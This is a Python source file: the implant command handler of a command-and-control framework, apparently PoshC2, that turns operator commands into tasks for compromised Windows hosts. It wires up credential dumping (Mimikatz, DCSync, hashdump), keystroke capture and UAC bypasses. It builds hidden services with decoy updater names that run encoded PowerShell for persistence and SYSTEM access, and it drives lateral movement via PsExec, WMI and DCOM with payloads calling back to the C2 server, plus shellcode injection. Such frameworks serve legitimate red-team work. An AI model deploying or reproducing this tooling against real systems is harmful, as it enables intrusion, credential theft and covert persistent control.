import base64, re, traceback, os, sys, readline
from Alias import ps_alias
from Colours import Colours
from Utils import randomuri, validate_sleep_time
from DB import new_task, update_sleep, get_history, select_item, update_label, unhide_implant, update_item, kill_implant, get_implantbyid, get_implantdetails, get_pid, get_c2server_all, get_newimplanturl, get_allurls, get_sharpurls, new_urldetails
from AutoLoads import check_module_loaded
from Help import COMMANDS, posh_help, posh_help1, posh_help2, posh_help3, posh_help4, posh_help5, posh_help6, posh_help7, posh_help8
from Config import ModulesDirectory, PayloadsDirectory, POSHDIR, ROOTDIR
from Core import readfile_with_completion, filecomplete
from Opsec import ps_opsec
from Payloads import Payloads
from Utils import argp, load_file, gen_key
from TabComplete import tabCompleter

if os.name == 'nt':
  import pyreadline.rlmain

def run_autoloads(command, randomuri, user):
  if command.startswith("invoke-eternalblue"): check_module_loaded("Exploit-EternalBlue.ps1", randomuri, user)
  elif command.startswith("invoke-psuacme"): check_module_loaded("Invoke-PsUACme.ps1", randomuri, user)
  elif command.startswith("bloodhound"): check_module_loaded("BloodHound.ps1", randomuri, user)
  elif command.startswith("brute-ad"): check_module_loaded("Brute-AD.ps1", randomuri, user)
  elif command.startswith("brute-locadmin"): check_module_loaded("Brute-LocAdmin.ps1", randomuri, user)
  elif command.startswith("bypass-uac"): check_module_loaded("Bypass-UAC.ps1", randomuri, user)
  elif command.startswith("cred-popper"): check_module_loaded("Cred-Popper.ps1", randomuri, user)
  elif command.startswith("cve-2016-9192"): check_module_loaded("CVE-2016-9192.ps1", randomuri, user)
  elif command.startswith("convertto-shellcode"): check_module_loaded("ConvertTo-Shellcode.ps1", randomuri, user)
  elif command.startswith("decrypt-rdcman"): check_module_loaded("Decrypt-RDCMan.ps1", randomuri, user)
  elif command.startswith("dump-ntds"): check_module_loaded("Dump-NTDS.ps1", randomuri, user)
  elif command.startswith("get-computerinfo"): check_module_loaded("Get-ComputerInfo.ps1", randomuri, user)
  elif command.startswith("get-creditcarddata"): check_module_loaded("Get-CreditCardData.ps1", randomuri, user)
  elif command.startswith("get-gppautologon"): check_module_loaded("Get-GPPAutologon.ps1", randomuri, user)
  elif command.startswith("get-gpppassword"): check_module_loaded("Get-GPPPassword.ps1", randomuri, user)
  elif command.startswith("get-idletime"): check_module_loaded("Get-IdleTime.ps1", randomuri, user)
  elif command.startswith("get-ipconfig"): check_module_loaded("Get-IPConfig.ps1", randomuri, user)
  elif command.startswith("get-keystrokes"): check_module_loaded("Get-Keystrokes.ps1", randomuri, user)
  elif command.startswith("get-hash"): check_module_loaded("Get-Hash.ps1", randomuri, user)
  elif command.startswith("get-locadm"): check_module_loaded("Get-LocAdm.ps1", randomuri, user)
  elif command.startswith("get-mshotfixes"): check_module_loaded("Get-MSHotFixes.ps1", randomuri, user)
  elif command.startswith("get-netstat"): check_module_loaded("Get-Netstat.ps1", randomuri, user)
  elif command.startswith("get-passnotexp"): check_module_loaded("Get-PassNotExp.ps1", randomuri, user)
  elif command.startswith("get-passpol"): check_module_loaded("Get-PassPol.ps1", randomuri, user)
  elif command.startswith("get-recentfiles"): check_module_loaded("Get-RecentFiles.ps1", randomuri, user)
  elif command.startswith("get-serviceperms"): check_module_loaded("Get-ServicePerms.ps1", randomuri, user)
  elif command.startswith("get-userinfo"): check_module_loaded("Get-UserInfo.ps1", randomuri, user)
  elif command.startswith("get-wlanpass"): check_module_loaded("Get-WLANPass.ps1", randomuri, user)
  elif command.startswith("invoke-pbind"): check_module_loaded("Invoke-Pbind.ps1", randomuri, user)
  elif command.startswith("get-domaingroupmember"): check_module_loaded("powerview.ps1", randomuri, user)
  elif command.startswith("invoke-kerberoast"): check_module_loaded("powerview.ps1", randomuri, user)
  elif command.startswith("resolve-ipaddress"): check_module_loaded("powerview.ps1", randomuri, user)
  elif command.startswith("invoke-userhunter"): check_module_loaded("powerview.ps1", randomuri, user)
  elif command.startswith("invoke-daisychain"): check_module_loaded("invoke-daisychain.ps1", randomuri, user)
  elif command.startswith("invoke-hostenum"): check_module_loaded("HostEnum.ps1", randomuri, user)
  elif command.startswith("inject-shellcode"): check_module_loaded("Inject-Shellcode.ps1", randomuri, user)
  elif command.startswith("inveigh-relay"): check_module_loaded("Inveigh-Relay.ps1", randomuri, user)
  elif command.startswith("inveigh"): check_module_loaded("Inveigh.ps1", randomuri, user)
  elif command.startswith("invoke-arpscan"): check_module_loaded("Invoke-Arpscan.ps1", randomuri, user)
  elif command.startswith("arpscan"): check_module_loaded("Invoke-Arpscan.ps1", randomuri, user)
  elif command.startswith("invoke-dcsync"): check_module_loaded("Invoke-DCSync.ps1", randomuri, user)
  elif command.startswith("invoke-eventvwrbypass"): check_module_loaded("Invoke-EventVwrBypass.ps1", randomuri, user)
  elif command.startswith("invoke-hostscan"): check_module_loaded("Invoke-Hostscan.ps1", randomuri, user)
  elif command.startswith("invoke-ms16-032-proxy"): check_module_loaded("Invoke-MS16-032-Proxy.ps1", randomuri, user)
  elif command.startswith("invoke-ms16-032"): check_module_loaded("Invoke-MS16-032.ps1", randomuri, user)
  elif command.startswith("invoke-mimikatz"): check_module_loaded("Invoke-Mimikatz.ps1", randomuri, user)
  elif command.startswith("invoke-psinject"): check_module_loaded("Invoke-PSInject.ps1", randomuri, user)
  elif command.startswith("invoke-pipekat"): check_module_loaded("Invoke-Pipekat.ps1", randomuri, user)
  elif command.startswith("invoke-portscan"): check_module_loaded("Invoke-Portscan.ps1", randomuri, user)
  elif command.startswith("invoke-powerdump"): check_module_loaded("Invoke-PowerDump.ps1", randomuri, user)
  elif command.startswith("invoke-psexec"): check_module_loaded("Invoke-SMBExec.ps1", randomuri, user)
  elif command.startswith("invoke-reflectivepeinjection"): check_module_loaded("Invoke-ReflectivePEInjection.ps1", randomuri, user)
  elif command.startswith("invoke-reversednslookup"): check_module_loaded("Invoke-ReverseDnsLookup.ps1", randomuri, user)
  elif command.startswith("invoke-runas"): check_module_loaded("Invoke-RunAs.ps1", randomuri, user)
  elif command.startswith("invoke-smblogin"): check_module_loaded("Invoke-SMBExec.ps1", randomuri, user)
  elif command.startswith("invoke-smbclient"): check_module_loaded("Invoke-SMBClient.ps1", randomuri, user)
  elif command.startswith("invoke-smbexec"): check_module_loaded("Invoke-SMBExec.ps1", randomuri, user)
  elif command.startswith("invoke-psexec"): check_module_loaded("Invoke-SMBExec.ps1", randomuri, user)
  elif command.startswith("invoke-shellcode"): check_module_loaded("Invoke-Shellcode.ps1", randomuri, user)
  elif command.startswith("invoke-sniffer"): check_module_loaded("Invoke-Sniffer.ps1", randomuri, user)
  elif command.startswith("invoke-sqlquery"): check_module_loaded("Invoke-SqlQuery.ps1", randomuri, user)
  elif command.startswith("invoke-tater"): check_module_loaded("Invoke-Tater.ps1", randomuri, user)
  elif command.startswith("invoke-thehash"): check_module_loaded("Invoke-TheHash.ps1", randomuri, user)
  elif command.startswith("invoke-tokenmanipulation"): check_module_loaded("Invoke-TokenManipulation.ps1", randomuri, user)
  elif command.startswith("invoke-wmichecker"): check_module_loaded("Invoke-WMIChecker.ps1", randomuri, user)
  elif command.startswith("invoke-wmicommand"): check_module_loaded("Invoke-WMICommand.ps1", randomuri, user)
  elif command.startswith("invoke-wscriptbypassuac"): check_module_loaded("Invoke-WScriptBypassUAC.ps1", randomuri, user)
  elif command.startswith("invoke-winrmsession"): check_module_loaded("Invoke-WinRMSession.ps1", randomuri, user)
  elif command.startswith("out-minidump"): check_module_loaded("Out-Minidump.ps1", randomuri, user)
  elif command.startswith("portscan"): check_module_loaded("PortScanner.ps1", randomuri, user)
  elif command.startswith("powercat"): check_module_loaded("powercat.ps1", randomuri, user)
  elif command.startswith("invoke-allchecks"): check_module_loaded("PowerUp.ps1", randomuri, user)
  elif command.startswith("set-lhstokenprivilege"): check_module_loaded("Set-LHSTokenPrivilege.ps1", randomuri, user)
  elif command.startswith("sharpsocks"): check_module_loaded("SharpSocks.ps1", randomuri, user)
  elif command.startswith("find-allvulns"): check_module_loaded("Sherlock.ps1", randomuri, user)
  elif command.startswith("test-adcredential"): check_module_loaded("Test-ADCredential.ps1", randomuri, user)
  elif command.startswith("new-zipfile"): check_module_loaded("Zippy.ps1", randomuri, user)
  elif command.startswith("get-netuser"): check_module_loaded("powerview.ps1", randomuri, user)
  elif command.startswith("invoke-aclscanner"): check_module_loaded("powerview.ps1", randomuri, user)
  elif command.startswith("get-dfsshare"): check_module_loaded("powerview.ps1", randomuri, user)
  elif command.startswith("get-objectacl"): check_module_loaded("powerview.ps1", randomuri, user)
  elif command.startswith("add-objectacl"): check_module_loaded("powerview.ps1", randomuri, user)
  elif command.startswith("get-netuser"): check_module_loaded("powerview.ps1", randomuri, user)
  elif command.startswith("get-domainuser"): check_module_loaded("powerview.ps1", randomuri, user)
  elif command.startswith("get-netcomputer"): check_module_loaded("powerview.ps1", randomuri, user)
  elif command.startswith("get-domaincomputer"): check_module_loaded("powerview.ps1", randomuri, user)
  elif command.startswith("get-netuser"): check_module_loaded("powerview.ps1", randomuri, user)
  elif command.startswith("get-netgroup"): check_module_loaded("powerview.ps1", randomuri, user)
  elif command.startswith("get-netgroupmember"): check_module_loaded("powerview.ps1", randomuri, user)
  elif command.startswith("get-netshare"): check_module_loaded("powerview.ps1", randomuri, user)
  elif command.startswith("invoke-sharefinder"): check_module_loaded("powerview.ps1", randomuri, user)
  elif command.startswith("get-netdomain"): check_module_loaded("powerview.ps1", randomuri, user)
  elif command.startswith("get-netdomaincontroller"): check_module_loaded("powerview.ps1", randomuri, user)
  elif command.startswith("get-netforest"): check_module_loaded("powerview.ps1", randomuri, user)
  elif command.startswith("find-domainshare"): check_module_loaded("powerview.ps1", randomuri, user)
  elif command.startswith("get-netforestdomain"): check_module_loaded("powerview.ps1", randomuri, user)
  elif command.startswith("invoke-mapdomaintrust"): check_module_loaded("powerview.ps1", randomuri, user)
  elif command.startswith("get-wmireglastloggedon"): check_module_loaded("powerview.ps1", randomuri, user)
  elif command.startswith("get-wmiregcachedrdpconnection"): check_module_loaded("powerview.ps1", randomuri, user)
  elif command.startswith("get-wmiregmounteddrive"): check_module_loaded("powerview.ps1", randomuri, user)
  elif command.startswith("invoke-wmievent"): check_module_loaded("Invoke-WMIEvent.ps1", randomuri, user)
  elif command.startswith("remove-wmievent"): check_module_loaded("Invoke-WMIEvent.ps1", randomuri, user)
  elif command.startswith("invoke-wmi"): check_module_loaded("Invoke-WMIExec.ps1", randomuri, user)
  elif command.startswith("get-lapspasswords"): check_module_loaded("Get-LAPSPasswords.ps1", randomuri, user)

def handle_ps_command(command, user, randomuri, startup, createdaisypayload, createproxypayload):
    try:
      check_module_loaded("Stage2-Core.ps1", randomuri, user)
    except Exception as e:
      print ("Error loading Stage2-Core.ps1: %s" % e)

    run_autoloads(command, randomuri, user)

    # alias mapping
    for alias in ps_alias:
      if command.startswith(alias[0]):
        command.replace(alias[0], alias[1])

    # opsec failures
    for opsec in ps_opsec:
      if opsec == command[:len(opsec)]:
        print (Colours.RED)
        print ("**OPSEC Warning**")
        impid = get_implantdetails(randomuri)
        ri = raw_input("Do you want to continue running - %s? (y/N) " % command)
        if ri.lower() == "n":
          return
        if ri == "":
          return  
        break

    if ('beacon' in command and '-beacon' not in command) or 'set-beacon' in command or 'setbeacon' in command:
      new_sleep = command.replace('set-beacon ', '')
      new_sleep = new_sleep.replace('setbeacon ', '')
      new_sleep = new_sleep.replace('beacon ', '').strip()
      if not validate_sleep_time(new_sleep):
        print(Colours.RED)
        print("Invalid sleep command, please specify a time such as 50s, 10m or 1h")
        print(Colours.GREEN)
      else:
        new_task(command, user, randomuri)
        update_sleep(new_sleep, randomuri)

    elif (command.startswith('label-implant')):
        label = command.replace('label-implant ', '')
        update_label(label, randomuri)
        startup(user)

    elif "searchhelp" in command:
      searchterm = (command).replace("searchhelp ","")
      import string
      helpful = string.split(posh_help, '\n')
      for line in helpful:
        if searchterm in line.lower():
          print (line)

    elif (command == "back") or (command == "clear"):
      startup(user)

    elif "install-servicelevel-persistencewithproxy" in command:
      C2 = get_c2server_all()
      if C2[11] == "":
        startup(user, "Need to run createproxypayload first")
      else:
        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
            C2[13], C2[11], "", "", C2[19], C2[20],
            C2[21], "%s?p" % get_newimplanturl(), PayloadsDirectory)
        payload = newPayload.CreateRawBase()
        cmd = "sc.exe create CPUpdater binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceUpdater start= auto" % (payload)
        new_task(cmd, user, randomuri)

    elif "install-servicelevel-persistence" in command:
      C2 = get_c2server_all()
      newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
          "", "", "", "", C2[19], C2[20],
          C2[21], get_newimplanturl(), PayloadsDirectory)
      payload = newPayload.CreateRawBase()
      cmd = "sc.exe create CPUpdater binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceUpdater start= auto" % (payload)
      new_task(cmd, user, randomuri)
      
    elif "remove-servicelevel-persistence" in command:
      new_task("sc.exe delete CPUpdater", user, randomuri)

    # psexec lateral movement
    elif "get-implantworkingdirectory" in command:
      new_task("pwd", user, randomuri)
    
    elif "get-system-withproxy" in command:
      C2 = get_c2server_all()
      if C2[11] == "":
        startup(user, "Need to run createproxypayload first")
      else:
        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
            C2[13], C2[11], "", "", C2[19], C2[20],
            C2[21], "%s?p" % get_newimplanturl(), PayloadsDirectory)
        payload = newPayload.CreateRawBase()
        cmd =  "sc.exe create CPUpdaterMisc binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceModule start= auto" % payload
        new_task(cmd, user, randomuri)
        cmd =  "sc.exe start CPUpdaterMisc"
        new_task(cmd, user, randomuri)
        cmd =  "sc.exe delete CPUpdaterMisc"
        new_task(cmd, user, randomuri)

    elif "get-system-withdaisy" in command:
      C2 = get_c2server_all()
      daisyname = raw_input("Payload name required: ")
      if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,daisyname))):
        with open("%s%spayload.bat" % (PayloadsDirectory,daisyname), "r") as p: payload = p.read()
        cmd =  "sc.exe create CPUpdaterMisc binpath= 'cmd /c %s' Displayname= CheckpointServiceModule start= auto" % payload
        new_task(cmd, user, randomuri)
        cmd =  "sc.exe start CPUpdaterMisc"
        new_task(cmd, user, randomuri)
        cmd =  "sc.exe delete CPUpdaterMisc"
        new_task(cmd, user, randomuri)

    elif "get-system" in command:
      C2 = get_c2server_all()
      newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
          "", "", "", "", C2[19], C2[20],
          C2[21], get_newimplanturl(), PayloadsDirectory)
      payload = newPayload.CreateRawBase()
      cmd =  "sc.exe create CPUpdaterMisc binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceModule start= auto" % payload
      new_task(cmd, user, randomuri)
      cmd =  "sc.exe start CPUpdaterMisc"
      new_task(cmd, user, randomuri)
      cmd =  "sc.exe delete CPUpdaterMisc"
      new_task(cmd, user, randomuri)

    elif "quit" in command:
      ri = raw_input("Are you sure you want to quit? (Y/n) ")
      if ri.lower() == "n":
        startup(user)
      if ri == "":
        sys.exit(0)
      if ri.lower() == "y":
        sys.exit(0)

    elif "invoke-psexecproxypayload" in command:
      check_module_loaded("Invoke-PsExec.ps1", randomuri, user)
      if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,"Proxy"))):
        with open("%s%spayload.bat" % (PayloadsDirectory,"Proxy"), "r") as p: payload = p.read()
        params = re.compile("invoke-psexecproxypayload ", re.IGNORECASE)
        params = params.sub("", command)
        cmd = "invoke-psexec %s -command \"%s\"" % (params,payload)
        new_task(cmd, user, randomuri)
      else:
        startup(user, "Need to run createproxypayload first")

    elif "invoke-psexecdaisypayload" in command:
      check_module_loaded("Invoke-PsExec.ps1", randomuri, user)
      daisyname = raw_input("Payload name required: ")
      if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,daisyname))):
        with open("%s%spayload.bat" % (PayloadsDirectory,daisyname), "r") as p: payload = p.read()
        params = re.compile("invoke-psexecdaisypayload ", re.IGNORECASE)
        params = params.sub("", command)
        cmd = "invoke-psexec %s -command \"%s\"" % (params,payload)
        new_task(cmd, user, randomuri)
      else:
        startup(user, "Need to run createdaisypayload first")

    elif "invoke-psexecpayload" in command:
      check_module_loaded("Invoke-PsExec.ps1", randomuri, user)
      C2 = get_c2server_all()
      newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
          "", "", "", "", C2[19], C2[20],
          C2[21], get_newimplanturl(), PayloadsDirectory)
      payload = newPayload.CreateRawBase()
      params = re.compile("invoke-psexecpayload ", re.IGNORECASE)
      params = params.sub("", command)
      cmd = "invoke-psexec %s -command \"powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\"" % (params,payload)
      new_task(cmd, user, randomuri)
      
    # wmi lateral movement
    elif "invoke-wmiproxypayload" in command:
      check_module_loaded("Invoke-WMIExec.ps1", randomuri, user)
      if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,"Proxy"))):
        with open("%s%spayload.bat" % (PayloadsDirectory,"Proxy"), "r") as p: payload = p.read()
        params = re.compile("invoke-wmiproxypayload ", re.IGNORECASE)
        params = params.sub("", command)
        cmd = "invoke-wmiexec %s -command \"%s\"" % (params,payload)
        new_task(cmd, user, randomuri)
      else:
        startup(user, "Need to run createproxypayload first")

    elif "invoke-wmidaisypayload" in command:
      check_module_loaded("Invoke-WMIExec.ps1", randomuri, user)
      daisyname = raw_input("Name required: ")
      if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,daisyname))):
        with open("%s%spayload.bat" % (PayloadsDirectory,daisyname), "r") as p: payload = p.read()
        params = re.compile("invoke-wmidaisypayload ", re.IGNORECASE)
        params = params.sub("", command)
        cmd = "invoke-wmiexec %s -command \"%s\"" % (params,payload)
        new_task(cmd, user, randomuri)
      else:
        startup(user, "Need to run createdaisypayload first")

    elif "invoke-wmipayload" in command:
      check_module_loaded("Invoke-WMIExec.ps1", randomuri, user)
      C2 = get_c2server_all()
      newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
          "", "", "", "", C2[19], C2[20],
          C2[21], get_newimplanturl(), PayloadsDirectory)
      payload = newPayload.CreateRawBase()
      params = re.compile("invoke-wmipayload ", re.IGNORECASE)
      params = params.sub("", command)
      cmd = "invoke-wmiexec %s -command \"powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\"" % (params,payload)
      new_task(cmd, user, randomuri)

    # dcom lateral movement
    elif "invoke-dcomproxypayload" in command:
      if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,"Proxy"))):
        with open("%s%spayload.bat" % (PayloadsDirectory,"Proxy"), "r") as p: payload = p.read()
        params = re.compile("invoke-wmiproxypayload ", re.IGNORECASE)
        params = params.sub("", command)
        p = re.compile(r'(?<=-target.).*')
        target = re.search(p, command).group()
        pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\cmd.exe\",$null,\"/c %s\",\"7\")" % (target,payload)
        new_task(pscommand, user, randomuri)
      else:
        startup(user, "Need to run createproxypayload first")

    elif "invoke-dcomdaisypayload" in command:
      daisyname = raw_input("Name required: ")
      if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,daisyname))):
        with open("%s%spayload.bat" % (PayloadsDirectory,daisyname), "r") as p: payload = p.read()
        p = re.compile(r'(?<=-target.).*')
        target = re.search(p, command).group()
        pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\cmd.exe\",$null,\"/c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\",\"7\")" % (target,payload)
        new_task(pscommand, user, randomuri)
      else:
        startup(user, "Need to run createdaisypayload first")

    elif "invoke-dcompayload" in command:
      C2 = get_c2server_all()
      newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
          "", "", "", "", C2[19], C2[20],
          C2[21], get_newimplanturl(), PayloadsDirectory)
      payload = newPayload.CreateRawBase()
      p = re.compile(r'(?<=-target.).*')
      target = re.search(p, command).group()
      pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\cmd.exe\",$null,\"/c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\",\"7\")" % (target,payload)
      new_task(pscommand, user, randomuri)

    # runas payloads
    elif "invoke-runasdaisypayload" in command:
      daisyname = raw_input("Name required: ")
      if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,daisyname))):
        with open("%s%spayload.bat" % (PayloadsDirectory,daisyname), "r") as p: payload = p.read()
        new_task("$proxypayload = \"%s\"" % payload, user, randomuri)
        check_module_loaded("Invoke-RunAs.ps1", randomuri, user)
        check_module_loaded("NamedPipeDaisy.ps1", randomuri, user)
        params = re.compile("invoke-runasdaisypayload ", re.IGNORECASE)
        params = params.sub("", command)
        pipe = "add-Type -assembly System.Core; $pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSDaisy'); $pi.Connect(); $pr = new-object System.IO.StreamReader($pi); iex $pr.ReadLine();"
        pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params,base64.b64encode(pipe.encode('UTF-16LE')))
        new_task(pscommand, user, randomuri)
      else:
        startup(user, "Need to run createdaisypayload first")

    elif "invoke-runasproxypayload" in command:
      C2 = get_c2server_all()
      if C2[11] == "":
        startup(user, "Need to run createproxypayload first")
      else:
        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
            C2[13], C2[11], "", "", C2[19], C2[20],
            C2[21], "%s?p" % get_newimplanturl(), PayloadsDirectory)
        payload = newPayload.CreateRawBase()
        proxyvar = "$proxypayload = \"powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\"" % payload
        new_task(proxyvar, user, randomuri)
        check_module_loaded("Invoke-RunAs.ps1", randomuri, user)
        check_module_loaded("NamedPipeProxy.ps1", randomuri, user)
        params = re.compile("invoke-runasproxypayload ", re.IGNORECASE)
        params = params.sub("", command)
        pipe = "add-Type -assembly System.Core; $pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSProxy'); $pi.Connect(); $pr = new-object System.IO.StreamReader($pi); iex $pr.ReadLine();"
        pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params,base64.b64encode(pipe.encode('UTF-16LE')))
        new_task(pscommand, user, randomuri)

    elif "invoke-runaspayload" in command:
      check_module_loaded("Invoke-RunAs.ps1", randomuri, user)
      check_module_loaded("NamedPipe.ps1", randomuri, user)
      params = re.compile("invoke-runaspayload ", re.IGNORECASE)
      params = params.sub("", command)
      pipe = "add-Type -assembly System.Core; $pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMS'); $pi.Connect(); $pr = new-object System.IO.StreamReader($pi); iex $pr.ReadLine();"
      pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params,base64.b64encode(pipe.encode('UTF-16LE')))
      new_task(pscommand, user, randomuri)

    elif command == "help" or command == "?":
      print (posh_help)
    elif command == "help 1":
      print (posh_help1)
    elif command == "help 2":
      print (posh_help2)
    elif command == "help 3":
      print (posh_help3)
    elif command == "help 4":
      print (posh_help4)
    elif command == "help 5":
      print (posh_help5)
    elif command == "help 6":
      print (posh_help6)
    elif command == "help 7":
      print (posh_help7)
    elif command == "help 8":
      print (posh_help8)

    elif "get-pid" in command:
      pid = get_implantdetails(randomuri)
      print (pid[8])

    elif "upload-file" in command:
      source = ""
      destination = ""
      s = ""
      nothidden = False
      if command.lower() == "upload-file":
        source = readfile_with_completion("Location of file to upload: ")
        while not os.path.isfile(source):
          print("File does not exist: %s" % source)
          source = readfile_with_completion("Location of file to upload: ")
        destination = raw_input("Location to upload to: ")
      else:
        args = argp(command)
        source = args.source
        destination = args.destination
        nothidden = args.nothidden
      try:
        with open(source, "rb") as source_file:
          s = source_file.read()
        if s:
          sourceb64 = base64.b64encode(s)
          destination = destination.replace("\\","\\\\")
          print ("")
          print ("Uploading %s to %s" % (source, destination))
          if (nothidden):
            uploadcommand = "Upload-File -Destination \"%s\" -NotHidden %s -Base64 %s" % (destination, nothidden, sourceb64)
          else:
            uploadcommand = "Upload-File -Destination \"%s\" -Base64 %s" % (destination, sourceb64)
          new_task(uploadcommand, user, randomuri)
        else:
          print("Source file could not be read or was empty")
      except Exception as e:
        print ("Error with source file: %s" % e)
        traceback.print_exc()

    elif "kill-implant" in command or "exit" in command:
      impid = get_implantdetails(randomuri)
      ri = raw_input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid[0])
      if ri.lower() == "n":
        print ("Implant not terminated")
      if ri == "":
        new_task("exit", user, randomuri)
        kill_implant(randomuri)
      if ri.lower() == "y":
        new_task("exit", user, randomuri)
        kill_implant(randomuri)

    elif "unhide-implant" in command:
      unhide_implant(randomuri)

    elif "hide-implant" in command:
      kill_implant(randomuri)

    elif command.startswith("migrate"):
      params = re.compile("migrate", re.IGNORECASE)
      params = params.sub("", command)
      migrate(randomuri, user, params)

    elif "loadmoduleforce" in command:
      params = re.compile("loadmoduleforce ", re.IGNORECASE)
      params = params.sub("", command)
      check_module_loaded(params, randomuri, user, force=True)

    elif "loadmodule" in command:
      params = re.compile("loadmodule ", re.IGNORECASE)
      params = params.sub("", command)
      check_module_loaded(params, randomuri, user)

    elif "invoke-daisychain" in command:
      check_module_loaded("Invoke-DaisyChain.ps1", randomuri, user)
      urls = get_allurls()
      new_task("%s -URLs '%s'" % (command,urls), user, randomuri)
      print ("Now use createdaisypayload")

    elif "inject-shellcode" in command:
      params = re.compile("inject-shellcode", re.IGNORECASE)
      params = params.sub("", command)
      check_module_loaded("Inject-Shellcode.ps1", randomuri, user)
      readline.set_completer(filecomplete)
      path = raw_input("Location of shellcode file: ")
      t = tabCompleter()
      t.createListCompleter(COMMANDS)
      readline.set_completer(t.listCompleter)
      try:
        shellcodefile = load_file(path)
        if shellcodefile != None:
          arch = "64"
          new_task("$Shellcode%s=\"%s\" #%s" % (arch,base64.b64encode(shellcodefile), os.path.basename(path)), user, randomuri)
          new_task("Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode%s))%s" % (arch, params), user, randomuri)
      except Exception as e:
        print ("Error loading file: %s" % e)

    elif "listmodules" in command:
      print (os.listdir("%s/Modules/" % POSHDIR))

    elif "modulesloaded" in command:
      ml = get_implantdetails(randomuri)
      print (ml[14])

    elif command == "ps":
      new_task("get-processlist", user, randomuri)

    elif command == "hashdump":
      check_module_loaded("Invoke-Mimikatz.ps1", randomuri, user)
      new_task("Invoke-Mimikatz -Command '\"lsadump::sam\"'", user, randomuri)

    elif command == "sharpsocks":
      check_module_loaded("SharpSocks.ps1", randomuri, user)
      import string
      from random import choice
      allchar = string.ascii_letters
      channel = "".join(choice(allchar) for x in range(25))
      sharpkey = gen_key()
      sharpurls = get_sharpurls()
      sharpurl = select_item("HostnameIP", "C2Server")
      new_task("Sharpsocks -Client -Uri %s -Channel %s -Key %s -URLs %s -Insecure -Beacon 2000" % (sharpurl,channel,sharpkey,sharpurls), user, randomuri)
      print ("git clone https://github.com/nettitude/SharpSocks.git")
      print ("SharpSocksServerTestApp.exe -c %s -k %s -l http://IPADDRESS:8080" % (channel,sharpkey))

    elif command == "history":
      startup(user, get_history())

    elif "reversedns" in command:
      params = re.compile("reversedns ", re.IGNORECASE)
      params = params.sub("", command)
      new_task("[System.Net.Dns]::GetHostEntry(\"%s\")" % params, user, randomuri)

    elif "createdaisypayload" in command:
      createdaisypayload(user, startup)

    elif "createproxypayload" in command:
      createproxypayload(user, startup)

    elif "createnewpayload" in command:
      createproxypayload(user, startup)

    else:
      if command:
        new_task(command, user, randomuri)
      return

def migrate(randomuri, user, params=""):
  implant = get_implantdetails(randomuri)
  implant_arch = implant[10]
  implant_comms = implant[15]

  if implant_arch == "AMD64":
    arch = "64"
  else:
    arch = "86"

  if implant_comms == "Normal":
    path = "%spayloads/Posh_v4_x%s_Shellcode.bin" % (ROOTDIR,arch)
    shellcodefile = load_file(path)
  elif implant_comms == "Daisy":
    daisyname = raw_input("Name required: ")
    path = "%spayloads/%sPosh_v4_x%s_Shellcode.bin" % (ROOTDIR,daisyname,arch)
    shellcodefile = load_file(path)
  elif implant_comms == "Proxy":
    path = "%spayloads/ProxyPosh_v4_x%s_Shellcode.bin" % (ROOTDIR,arch)
    shellcodefile = load_file(path)

  check_module_loaded("Inject-Shellcode.ps1", randomuri, user)
  new_task("$Shellcode%s=\"%s\" #%s" % (arch,base64.b64encode(shellcodefile), os.path.basename(path)), user, randomuri)
  new_task("Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode%s))%s" % (arch, params), user, randomuri)